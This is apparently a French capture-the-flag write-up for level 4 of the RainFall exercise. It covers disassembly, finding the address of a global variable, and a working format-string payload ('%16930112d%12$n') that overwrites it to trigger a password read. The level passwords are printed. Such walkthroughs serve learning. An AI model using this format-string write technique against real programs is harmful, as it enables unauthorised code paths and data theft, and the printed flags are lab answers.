# LEVEL 4

### Reconnaissance

On se connecte au level4 avec le password : b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa

En analysant le binaire, on voit qu'il fait un appel a printf et qu'il est vulnérable aux format strings, pour s'en convaincre:

```
level4@RainFall:~$ python -c 'print "AAAA" + "%x " * 10'|./level4 
AAAAb7ff26b0 bffff784 b7fd0ff4 0 0 bffff748 804848d bffff540 200 b7fd1ac0 
```

Ce level est similaire au level3, nous avons une comparaison de m:
```
[0x08048390]> pdf@sym.n
            ; CALL XREF from main @ 0x80484ad
┌ 80: sym.n ();
│           ; var char *s @ ebp-0x208
│           ; var int32_t size @ esp+0x4
│           ; var FILE *stream @ esp+0x8
│           0x08048457      55             push ebp
│           0x08048458      89e5           mov ebp, esp
│           0x0804845a      81ec18020000   sub esp, 0x218
│           0x08048460      a104980408     mov eax, dword [obj.stdin]  ; loc.__bss_start                                                                                      
│                                                                      ; [0x8049804:4]=0                                                                                      
│           0x08048465      89442408       mov dword [stream], eax     ; FILE *stream
│           0x08048469      c74424040002.  mov dword [size], 0x200     ; [0x200:4]=-1 ; 512 ; int size                                                                        
│           0x08048471      8d85f8fdffff   lea eax, dword [s]
│           0x08048477      890424         mov dword [esp], eax        ; char *s
│           0x0804847a      e8d1feffff     call sym.imp.fgets          ; char *fgets(char *s, int size, FILE *stream)                                                         
│           0x0804847f      8d85f8fdffff   lea eax, dword [s]
│           0x08048485      890424         mov dword [esp], eax        ; char *format
│           0x08048488      e8b7ffffff     call sym.p
│           0x0804848d      a110980408     mov eax, dword [obj.m]      ; [0x8049810:4]=0                                                                                      
│           0x08048492      3d44550201     cmp eax, 0x1025544
│       ┌─< 0x08048497      750c           jne 0x80484a5
│       │   0x08048499      c70424908504.  mov dword [esp], str.bin_cat__home_user_level5_.pass ; [0x8048590:4]=0x6e69622f ; "/bin/cat /home/user/level5/.pass" ; const char *string                                                                                 
│       │   0x080484a0      e8bbfeffff     call sym.imp.system         ; int system(const char *string)                                                                       
│       │   ; CODE XREF from sym.n @ 0x8048497
│       └─> 0x080484a5      c9             leave
└           0x080484a6      c3             ret

```

La difficulté ici, est que la valeur de m est beaucoup plus grande.
```
Python 2.7.18 (default, Apr 20 2020, 20:30:41) 
[GCC 9.3.0] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> 0x1025544
16930116
```

### Exploitation

Nous allons procédé de la meme manière que le précédent level:

D'abord on trouve l'addresse de m:
```
(gdb) i variables 
All defined variables:

Non-debugging symbols:
0x08048588  _fp_hw
0x0804858c  _IO_stdin_used
0x080486f8  __FRAME_END__
0x080496fc  __CTOR_LIST__
0x080496fc  __init_array_end
0x080496fc  __init_array_start
0x08049700  __CTOR_END__
0x08049704  __DTOR_LIST__
0x08049708  __DTOR_END__
0x0804970c  __JCR_END__
0x0804970c  __JCR_LIST__
0x08049710  _DYNAMIC
0x080497dc  _GLOBAL_OFFSET_TABLE_
0x080497fc  __data_start
0x080497fc  data_start
0x08049800  __dso_handle
0x08049804  stdin@@GLIBC_2.0
0x08049808  completed.6159
0x0804980c  dtor_idx.6161
0x08049810  m
[...]
```

On converti notre adresse:
```
Python 2.7.18 (default, Apr 20 2020, 20:30:41) 
[GCC 9.3.0] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> from pwn import *
>>> p32(0x08049810)
'\x10\x98\x04\x08'
```

On regarde la position du buffer dans la stack
```
level4@RainFall:~$ python -c 'print "AAAA" + " %x" * 20'|./level4 
AAAA b7ff26b0 bffff784 b7fd0ff4 0 0 bffff748 804848d bffff540 200 b7fd1ac0 b7ff37d0 41414141 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825
```
On est a la 12eme position

On calcule la valeur de m:

16930116 - 4 = 16930112

4 etant le nombres d'octets que l'on a besoin pour ecrire notre adresse

Si on essaye de faire de la meme manière que le level3:
```
level4@RainFall:~$ (python -c 'print "\x10\x98\x04\x08" + "A" * 16930112 + "%12$n"')|./level4
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAATraceback (most recent call last):
  File "<string>", line 1, in <module>
IOError: [Errno 32] Broken pipe
```
On a un Broken pipe. Normal, le buffer n'est pas assez grand pour acceuillir autant de char.
Il faut faire d'une autre manière : %d, oui oui, le formateur décimal de printf


Maintenant on peux préparé notre payload:
```
[ADRESSE][%<valeur de m>d%<position dans la stack>$n]

[\x10\x98\x04\x08][%16930112d%12$n]
```

Et le lancer:
```
level4@RainFall:~$ (python -c 'print "\x10\x98\x04\x08" + "%16930112d%12$n"')|./level4
[...]
                                                                    -1208015184
0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a

```
Enjoy :)

